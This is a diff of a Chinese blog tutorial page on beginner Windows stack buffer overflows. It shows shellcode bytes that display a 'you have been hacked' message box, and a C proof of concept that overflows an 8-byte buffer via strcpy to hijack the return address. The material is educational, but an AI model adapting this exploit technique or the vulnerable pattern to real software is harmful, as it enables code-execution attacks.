+<h4 id="shellcode编写"><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a>shellcode编写</h4><p>通过ollydbg或者<a href="https://3gstudent.github.io/3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E9%80%9A%E8%BF%87VisualStudio%E7%94%9F%E6%88%90shellcode/" target="_blank" rel="noopener">vs</a>查看机器码<br>或者<a href="http://brieflyx.me/2015/linux-tools/msfvenom-intro/" target="_blank" rel="noopener">msf</a>生成<br>机器码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">83EC 50</span><br><span class="line">33DB</span><br><span class="line">53</span><br><span class="line">68 696E6720</span><br><span class="line">68 5761726E</span><br><span class="line">8BC4</span><br><span class="line">53</span><br><span class="line">68 21202020</span><br><span class="line">68 4D30726B</span><br><span class="line">68 20627920</span><br><span class="line">68 636B6564</span><br><span class="line">68 6E206861</span><br><span class="line">68 20626565</span><br><span class="line">68 68617665</span><br><span class="line">68 796F7520</span><br><span class="line">8BCC</span><br><span class="line">53</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">53</span><br><span class="line">B8 99EA1A76</span><br><span class="line">FFD0</span><br><span class="line">53</span><br><span class="line">B8 52BE0077</span><br><span class="line">FFD0</span><br></pre></td></tr></table></figure></p>
+<p>所以对应的shellcode是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x83\xEC\x50&quot;</span><br><span class="line">  &quot;\x33\xDB&quot;</span><br><span class="line">  &quot;\x53&quot;</span><br><span class="line">  &quot;\x68\x69\x6E\x67\x20&quot;</span><br><span class="line">  &quot;\x68\x57\x61\x72\x6E&quot;</span><br><span class="line">  &quot;\x8B\xC4&quot;</span><br><span class="line">  &quot;\x53&quot;</span><br><span class="line">  &quot;\x68\x21\x20\x20\x20&quot;</span><br><span class="line">  &quot;\x68\x4D\x30\x72\x6B&quot;</span><br><span class="line">  &quot;\x68\x20\x62\x79\x20&quot;</span><br><span class="line">  &quot;\x68\x63\x6B\x65\x64&quot;</span><br><span class="line">  &quot;\x68\x6E\x20\x68\x61&quot;</span><br><span class="line">  &quot;\x68\x20\x62\x65\x65&quot;</span><br><span class="line">  &quot;\x68\x68\x61\x76\x65&quot;</span><br><span class="line">  &quot;\x68\x79\x6F\x75\x20&quot;</span><br><span class="line">  &quot;\x8B\xCC&quot;</span><br><span class="line">  &quot;\x53&quot;</span><br><span class="line">  &quot;\x50&quot;</span><br><span class="line">  &quot;\x51&quot;</span><br><span class="line">  &quot;\x53&quot;</span><br><span class="line">  &quot;\xB8\x99\xEA\xF0\x75&quot;</span><br><span class="line">  &quot;\xFF\xD0&quot;</span><br><span class="line">  &quot;\x53&quot;</span><br><span class="line">  &quot;\xB8\x52\xBE\xC0\x76&quot;</span><br><span class="line">  &quot;\xFF\xD0&quot;;</span><br></pre></td></tr></table></figure></p>
+<h4 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;windows.h&quot;</span><br><span class="line">#include &quot;stdio.h&quot;</span><br><span class="line">#include &quot;string.h&quot;</span><br><span class="line"></span><br><span class="line">char name[] = &quot;\x41\x41\x41\x41\x41\x41\x41\x41&quot;</span><br><span class="line">              &quot;\x41\x41\x41\x41&quot;   //ebp</span><br><span class="line">			  &quot;\xb3\xa0\xf6\x75&quot;   //Return address \xb3\xa0\x20\x76</span><br><span class="line">			  &quot;\x83\xEC\x50&quot;</span><br><span class="line">			  &quot;\x33\xDB&quot;</span><br><span class="line">			  &quot;\x53&quot;</span><br><span class="line">			  &quot;\x68\x69\x6E\x67\x20&quot;</span><br><span class="line">			  &quot;\x68\x57\x61\x72\x6E&quot;</span><br><span class="line">			  &quot;\x8B\xC4&quot;</span><br><span class="line">			  &quot;\x53&quot;</span><br><span class="line">			  &quot;\x68\x21\x20\x20\x20&quot;</span><br><span class="line">			  &quot;\x68\x4D\x30\x72\x6B&quot;</span><br><span class="line">			  &quot;\x68\x20\x62\x79\x20&quot;</span><br><span class="line">			  &quot;\x68\x63\x6B\x65\x64&quot;</span><br><span class="line">			  &quot;\x68\x6E\x20\x68\x61&quot;</span><br><span class="line">			  &quot;\x68\x20\x62\x65\x65&quot;</span><br><span class="line">			  &quot;\x68\x68\x61\x76\x65&quot;</span><br><span class="line">			  &quot;\x68\x79\x6F\x75\x20&quot;</span><br><span class="line">			  &quot;\x8B\xCC&quot;</span><br><span class="line">			  &quot;\x53&quot;</span><br><span class="line">			  &quot;\x50&quot;</span><br><span class="line">			  &quot;\x51&quot;</span><br><span class="line">			  &quot;\x53&quot;</span><br><span class="line">			  &quot;\xB8\x99\xEA\xF0\x75&quot;</span><br><span class="line">			  &quot;\xFF\xD0&quot;</span><br><span class="line">			  &quot;\x53&quot;</span><br><span class="line">			  &quot;\xB8\x52\xBE\xC0\x76&quot;</span><br><span class="line">			  &quot;\xFF\xD0&quot;;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	char buffer[8];</span><br><span class="line">	LoadLibrary(&quot;user32.dll&quot;);</span><br><span class="line">	strcpy(buffer,name);</span><br><span class="line">	printf(&quot;%s\n&quot;,buffer);</span><br><span class="line">	getchar();</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p><img src="/2017/08/02/windows栈溢出入门/1.png" alt=""></p>
 <h4 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h4><ul>
-<li><a href="http://bbs.pediy.com/search-_E5_8E_9F_E5_88_9B_5DOllyDBG_20_E5_85_A5_E9_97_A8_E7_B3_BB_E5_88_97.htm" target="_blank" rel="external">OllyDBG 入门系列</a><br><a href="http://blog.csdn.net/niexinming/article/details/78144301" target="_blank" rel="external">覆盖虚表方式利用栈溢出漏洞</a><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
-<li><a href="https://www.youtube.com/watch?v=aEZKGW_VTd4" target="_blank" rel="external">Hacker Course Buffer Overflow - A Practical Example</a></li>
+<li><a href="http://bbs.pediy.com/search-_E5_8E_9F_E5_88_9B_5DOllyDBG_20_E5_85_A5_E9_97_A8_E7_B3_BB_E5_88_97.htm" target="_blank" rel="noopener">OllyDBG 入门系列</a><br><a href="http://blog.csdn.net/niexinming/article/details/78144301" target="_blank" rel="noopener">覆盖虚表方式利用栈溢出漏洞</a><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
+<li><a href="https://www.youtube.com/watch?v=aEZKGW_VTd4" target="_blank" rel="noopener">Hacker Course Buffer Overflow - A Practical Example</a></li>
 </ul>
 
       
@@ -478,8 +476,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/08/09/Awosome-Hacking系列/" rel="next" title="Awosome Hacking系列">
-                <i class="fa fa-chevron-left"></i> Awosome Hacking系列
+              <a href="/2017/07/26/metasploit调试/" rel="next" title="metasploit调试以及ruby入门踩坑">
+                <i class="fa fa-chevron-left"></i> metasploit调试以及ruby入门踩坑
               </a>
             
           </div>
@@ -488,8 +486,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/07/26/metasploit调试/" rel="prev" title="metasploit调试以及ruby入门踩坑">
-                metasploit调试以及ruby入门踩坑 <i class="fa fa-chevron-right"></i>
+              <a href="/2017/08/09/Awosome-Hacking系列/" rel="prev" title="Awosome Hacking系列">
+                Awosome Hacking系列 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -538,7 +536,7 @@
 
       
         <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
             文章目录
           </li>
           <li class="sidebar-nav-overview" data-target="site-overview">
@@ -548,10 +546,8 @@
       
 
       <section class="site-overview sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <img class="site-author-image" itemprop="image"
-               src="/uploads/avatar.jpg"
-               alt="M0rk" />
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/uploads/avatar.jpg" alt="M0rk">
           <p class="site-author-name" itemprop="name">M0rk</p>
            
               <p class="site-description motion-element" itemprop="description"></p>
@@ -678,7 +674,7 @@
         <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
 </script>
 
-<div class="copyright" >
+<div class="copyright">
   
   &copy; 
   <span itemprop="copyrightYear">2020</span>
